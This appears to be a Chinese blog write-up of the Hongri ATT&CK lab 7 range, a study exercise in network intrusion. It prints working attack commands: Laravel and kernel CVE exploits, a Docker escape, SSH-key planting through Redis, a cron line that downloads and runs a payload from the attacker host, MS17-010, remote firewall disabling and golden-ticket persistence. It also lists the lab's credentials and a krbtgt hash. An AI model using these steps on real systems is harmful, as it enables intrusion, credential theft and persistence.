---
title: 红日安全att&ck靶场7
date: 2023-09-06 21:25:14
categories: 
- 渗透测试
- 靶机练习
---

## 环境搭建

![setup](https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/PIcGosetup.png)

桥接模式无法上网，请自行选择网卡,当前环境为192.168.14.0

复制粘贴一份环境信息，照着启动就行

```
DMZ区的 Ubuntu 需要启动redis和nginx服务：

sudo redis-server /etc/redis.conf

sudo /usr/sbin/nginx -c /etc/nginx/nginx.conf

sudo iptables -F

第二层网络的 Ubuntu需要启动docker容器：

sudo service docker start

sudo docker start 8e172820ac78

第三层网络的 Windows 7 （PC 1）需要启动通达OA：

C:\MYOA\bin\AutoConfig.exe


域用户信息
域用户账户和密码如下：

Administrator：Whoami2021

whoami：Whoami2021

bunny：Bunny2021

moretz：Moretz2021

Ubuntu 1：

web：web2021

Ubuntu 2：

ubuntu：ubuntu

通达OA账户：

admin：admin657260
```

## 外网打点

攻击机ip：192.168.14.131

web1机器ip：192.168.14.247

启动nmap扫描端口

![web1-namp](https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/PIcGoweb1-namp.png)

开放ssh连接，如果有密钥我们就能直接连接了，在这之前还是看看80和81端口，80端口显示404notfound,81端口则是显示了laravewl的框架

先采用[larasploit](https://github.com/crowsec-edtech/larasploit)进行81端口的扫描

![larasploit](https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/PIcGolarasploit.png)

框架版本，php版本以及部分cookie,再上AWVS进行扫描

![web1-awvs](https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/PIcGoweb1-awvs.png)

扫出来redis的未授权，以及Debug状态，由于刚才扫描端口没有发先开启的redis端口，而debug模式下的laravel有一个rce漏洞

### CVE-2021-3129获取shell

项目地址：https://github.com/joshuavanderpoll/CVE-2021-3129

利用该项目，我们能够成功执行shell

![web1-rce](https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/PIcGoweb1-rce.png)

能够执行任意命令后，将shell反弹到msf上，试了一下好像无法直接反弹shell回来，由于是php站点，可以尝试写一个php文件

![web1-cat-faild](https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/PIcGoweb1-cat-faild.png)

能够看到我们写的shell中$_REQUEST被整个过滤掉了，先收集一下目标机器上的信息

![web1-database-php](https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/PIcGoweb1-database-php.png)

似乎也禁止了外部文件的下载，没法上传shell,换一个工具写shell

https://github.com/zhzyker/CVE-2021-3129

先运行一下再选中能够使用的链子就能执行shell,将执行的代码修改为写入文件![web1-sehll-win!](https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/PIcGoweb1-sehll-win!.png)

再用蚁剑进行连接即可，连接上蚁剑后对目标主机进行信息收集

![web1-yiujian](https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/PIcGoweb1-yiujian.png)

反弹shell失败后，发现我们取得的shell是一个docker容器，81的http服务也能从侧面说明这一点，接下来要通过docker逃逸拿到目标主机的shell

不过docker逃逸需要用到root权限，所以我们还是先获取root权限

```
find / -perm -u=s -type f 2>/dev/null 
```

在jobs目录下找到可执行的shell文件

![web1-jobs-shell](https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/PIcGoweb1-jobs-shell.png)

该c文件执行ps命令，执行shell后查看进程也确实是如此，用蚁剑反弹一个shell回来，利用环境变量进行提权

```
echo "/bin/bash" > /tmp/ps
chmod 777 /tmp/ps
echo $PATH
export PATH=/tmp:$PATH
./shell
whoami
```

![web1-docker-root](https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/PIcGoweb1-docker-root.png)

成功拿到root权限，可以利用msf生成shell文件将shell上传到msf上

![web1-shell-meterpreter-session1](https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/PIcGoweb1-shell-meterpreter-session1.png)

### Docker特权模式逃逸

特权模式于版本0.6时被引入Docker，允许容器内的root拥有外部物理机root权限，而此前容器内root用户仅拥有外部物理机普通用户权限。

当控制使用特权模式启动的容器时，docker管理员可通过mount命令将外部宿主机磁盘设备挂载进容器内部，获取对整个宿主机的文件读写权限，此外还可以通过写入计划任务等方式在宿主机执行命令。

创建目录，并将可用设备sda1挂载到目录下

```
mkdir hacker
mount /dev/sda1 /hacker
```

![web1-mount-hacker](https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/PIcGoweb1-mount-hacker.png)

如图所示挂载成功，挂载成功我们就可以写入内容到宿主机，比如计划任务，采用msf的web_delivery进行上线

```
use multi/script/web_delivery
set payload linux/x64/meterpreter/reverse_tcp
set target 7 //msf6版本，7为linux系统
set lhost 192.168.14.131
set lport 4445
echo '*/1 * * * * wget -qO ERYJXrml --no-check-certificate http://192.168.14.131:8080/e14bgbNf; chmod +x ERYJXrml; ./ERYJXrml& disown' >> /hacker/var/spool/cron/crontabs
```

因为环境问题导致的shell无法接收，只能采取别的方法

### Redis未授权访问漏洞

之前还扫出来一个redis的未授权访问，尝试去连接

```
redis-cli -h 192.168.14.247 -p 6379
```

发现能够直接连接

使用工具rce失败

#### 公私钥认证

在攻击机上生成密钥

```
ssh-keygen -f hacker
```

将生成的密钥内容保存到本地hacker.txt

```
cat hacker.txt | redis-cli -h 192.168.14.247 -x set xxxx
```

![web1-redis](https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/PIcGoweb1-redis.png)

通过设置路径等操作，成功shh连接对方主机，并且也不在docker环境内，为root权限，看下这台机器的信息

![web1-ubutun18](https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/PIcGoweb1-ubutun18.png)

两个网段，192.168.52.0,版本为ubuntu18,重新回到上一个漏洞，利用存在用户写密钥的方法进行shh连接，在web1生成公钥

```
ssh-keygen -f hacker
```

并将生成的公钥上传到我们使用docker挂载到目标主机的ubuntu用户的/.ssh下，问题是我们怎么去找到web2的真实ip,很简单，通过

```
arp -a 
```

查看表

![web1-arp-a](https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/PIcGoweb1-arp-a.png)

能够看到web与这台机器有过联系，利用ssh去登录web2

![web2-first-step](https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/sunrise7/web2-first-step.png)

成功登陆后查看该系统的版本信息，以及主机有无信息

```
Linux ubuntu 4.4.0-142-generic #168~14.04.1-Ubuntu SMP Sat Jan 19 11:26:28 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
192.168.52.20
192.168.93.10
```

#### CVE-2021-3493内核提权web2

```
https://github.com/briskets/CVE-2021-3493
```

从上地址下载poc,上传到web2上编译执行获得root权限

![web2-root](https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/sunrise7/web2-root.png)

利用web_delivery将shell传回msf

![web2-msf](https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/sunrise7/web2-msf.png)

## 二级网络渗透

搭建代理，上传frpc.ini和frpc到web2上运行，搭建socks5

![web2-prpc](https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/sunrise7/web2-prpc.png)

搭建成功回kali修改代理规则即可,可能是配置问题或者是环境问题，都没有连上frp，所以我直接进msf添加一个52段的路由来通向内网

![web2-route](https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/sunrise7/web2-route.png)

msf搭建sock4a代理到攻击机上，利用msf扫描本机的两个网段

```
use  auxiliary/scanner/discovery/udp_probe
set rhosts 192.168.52.1-255
set threads 5
run
```

![ew_for_linux](https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/sunrise7/ew_for_linux.png)

用ew_for_linux64搭建代理

![52.30扫货](https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/sunrise7/52.30%E6%89%AB%E8%B4%A7.png)

msf识别到一台新的52.30主机，使用nmap详细扫描

![pc1-port-open](https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/sunrise7/pc1-port-open.png)

开放了445端口，可以尝试直接ms17,也能从8080端口的http服务入手，访问8080

![pc1-oa](https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/sunrise7/pc1-oa.png)

通达OA的后台,在windows上把代理搭起来,用漏扫的扫描器

![pc1-oa2](https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/sunrise7/pc1-oa2.png)

存在文件上传漏洞，通过上传图片马和文件包含能执行任意命令

复现参考:https://blog.csdn.net/szgyunyun/article/details/107104288

![pc1-upload](https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/sunrise7/pc1-upload.png)

利用文件包含漏洞成功执行命令

![pc1-whoami](https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/sunrise7/pc1-whoami.png)

由于该目标机器出网，可以尝试上线cs,使用cs生成powershell后门命令，利用cmd执行powershell命令

![pc-1](https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/sunrise7/pc-1.png)

利用powershell码成功上线CS

### 内网信息收集

PC1有两个ip

192.168.52.30

192.168.93.20

```
arp -a 扫描内网
```

![pc1-arp-a](https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/sunrise7/pc1-arp-a.png)

能看到93网关还有两台主机，分别是30和40

抓取明文密码

![dc-pass](https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/sunrise7/dc-pass.png)

能够抓到域控主机和pc2的密码

通过扫描93网段的主机，将目标机器添加到目标列表中

## 三级网络渗透

### CS做法

通过抓取到的密码与PC2主机建立SMB连接

![pc2-smc-pc1](https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/sunrise7/pc2-smc-pc1.png)

上线后先关闭防火墙

```
netsh advfirewall set allprofiles state off
```

利用PC2做跳板机来和DC做SMB搭建，成功上线DC

![DC](https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/sunrise7/DC.png)

### MS17_010拿PC2

```
msf6 exploit(windows/smb/psexec) > use exploit/windows/smb/ms17_010_eternalblue
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/smb/ms17_010_eternalblue) > set rhosts 192.168.93.40
rhosts => 192.168.93.40
msf6 exploit(windows/smb/ms17_010_eternalblue) > set payload windows/x64/meterpreter/bind_tcp
payload => windows/x64/meterpreter/bind_tcp
msf6 exploit(windows/smb/ms17_010_eternalblue) > set rhost 192.168.93.40
rhost => 192.168.93.40
msf6 exploit(windows/smb/ms17_010_eternalblue) > set lport 4444
lport => 4444
msf6 exploit(windows/smb/ms17_010_eternalblue) > run
```

利用msf上的ms17工具拿到shell

![msf-pc2](https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/sunrise7/msf-pc2.png)

由于已经抓取到密码，可以利用smb传递直接上线域控，但在那之前需要关闭防火墙，由于两台机器135和445均开放，利用命令即可关闭

```
net use \\192.168.93.30\ipc$ "Whoami2021" /user:"Administrator"
sc \\192.168.93.30 create unablefirewall binpath= "netsh advfirewall set allprofiles state off"
sc \\192.168.93.30 start unablefirewall
```

### SMB传递DC

关闭DC防火墙后再进行登录

```
use exploit/windows/smb/psexec
set payload windows/meterpreter/bind_tcp
```

![DC-msf](https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/sunrise7/DC-msf.png)

## 权限维持

### 黄金票据

这里用DC来做票据，获取机器的SID值,要使用的SID值除开最后一个-之前

```
wmic useraccount get /all
```

![DC-SID](https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/sunrise7/DC-SID.png)

获取机器上krbtgt的密码hash

![DC-hash](https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/sunrise7/DC-hash.png)

```
6be58bfcc0a164af2408d1d3bd313c2a
```

调用mimikatz生成黄金票据

![DC-golden-tickey](https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/sunrise7/DC-golden-tickey.png)

成功后我们就能在非域控机上访问域控的文件等

![dc-dir-gloden](https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/sunrise7/dc-dir-gloden.png)

至此整套环境被拿下

## 小结：

ssh的运用方法没想到，对docker并不是很了解，看到没有命令，没想到自己在docker容器里面，这套环境的网络很有意思，机器对二层网络里的docker做了映射发到了DMZ区的机器上，其实拿到的是docker容器的shell，来看看两台ubuntu上的配置文件

web1-conf

![web1-conf](https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/sunrise7/web1-conf.png)

web-docker

![web2-docker](https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/sunrise7/web2-docker.png)

web2的8000端口用于开启docker服务的80端口，而8000端口被代理到web1的81端口，web1又将该服务代理到`www.whopen.com`上，因此web1是做一个代理服务器的作用
